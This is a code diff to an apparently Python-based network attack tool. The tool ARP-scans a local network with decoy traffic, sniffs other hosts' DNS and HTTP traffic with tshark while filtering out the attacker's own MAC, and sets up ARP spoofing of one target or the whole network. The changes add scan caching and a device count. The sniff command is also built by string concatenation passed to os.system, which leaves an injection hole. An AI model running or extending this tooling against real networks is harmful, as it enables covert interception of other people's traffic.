@@ -11,6 +11,7 @@ import random
 from threading import * #Use thread for decoy scan
 
 
+
 class Decoy(Thread):
     def __init__(self, fakeIp, targetList, interface):
         Thread.__init__(self)
@@ -26,11 +27,12 @@ class Sniffer(Thread):
         Thread.__init__(self)
         self.interface = interface
         self.type = type
-        self.interface = interface
 
     def run(self):
+        my_mac = getHwAddr(self.interface)
         if self.type == "dns":
-            os.system("sudo tshark -i wlan0 -f 'dst port 53 or port 80' -Y 'eth.src!=84:ef:18:7b:34:14' -T ps > dns_http_sniffed.txt" ) #-Y 'eth.src!=84:ef:18:7b:34:14'
+            arg = "sudo tshark -i "+self.interface+" -f 'dst port 53 or port 80' -Y 'eth.src!="+my_mac+"' -T ps > dns_http_sniffed.txt"
+            os.system(arg) #-Y 'eth.src!=''
 
 class Spoofer(Thread):
     def __init__(self, gateway_ip, target_ip, my_mac, interface):
@@ -96,8 +98,20 @@ def get_all_addresses(my_interface):
         addr_list.append(str(address))
     return addr_list
 
-def arp_scan(my_interface, decoy=False, verbosity=0):
+def arp_scan(my_interface, decoy=False, verbosity=0, output="scan.txt"):
     addr_list = get_all_addresses(my_interface)
+    ip_list = []
+    if recent_file(output):
+        print(colors.OKGREEN+"We found a recent scan. Do you want to use it? y/n"+colors.ENDC)
+        answer = raw_input()
+        if answer == "y":
+            my_file = open(output,"r")
+            for lines in my_file:
+                ip_list.append(lines.strip("\n"))
+            print ip_list
+            my_file.close()
+            return ip_list
+    my_file = open(output,"w")
     #-----------------------------ARP scan------------------------------------------
     #Start the ARP scan
     if verbosity > 0:
@@ -116,11 +130,11 @@ def arp_scan(my_interface, decoy=False, verbosity=0):
     #-----------------------------Save the result------------------------------------------
     nb_decoy=3 # limit the number of decoys
     threads_list = []
-    ip_list = []
     for snd, rcv in ans:
         his_ip = rcv.sprintf(r"%Ether.psrc%")
         his_mac = rcv.sprintf(r"%Ether.src%")
         ip_list.append(his_ip)
+        my_file.write(his_ip+"\n")
         if decoy and nb_decoy > 0:
             my_thread = Decoy(str(his_ip), addr_list, my_interface)
             my_thread.start()
@@ -137,6 +151,7 @@ def arp_scan(my_interface, decoy=False, verbosity=0):
         print(colors.OKGREEN+"\nIt's done."+colors.ENDC+" Press a button to quit")
     for current in threads_list:
         current.join()
+    my_file.close()
     return ip_list
 
 def preset_arp_spoofing(ip_forward=True):
@@ -160,7 +175,8 @@ def preset_arp_spoofing(ip_forward=True):
 
     print(colors.HEADER+"search devices on the network"+colors.ENDC)
     target_list = arp_scan(my_interface)
-    print(colors.CLEAR+colors.OKBLUE+colors.BOLD+"press y to spoof all the network")
+    print(colors.CLEAR+colors.OKGREEN+"Number of devices : "+str(len(target_list))+colors.ENDC)
+    print(colors.OKBLUE+colors.BOLD+"press y to spoof all the network")
     print("press n to spoof only one target on the network"+colors.ENDC)
     answer = raw_input()
     if answer == "n":
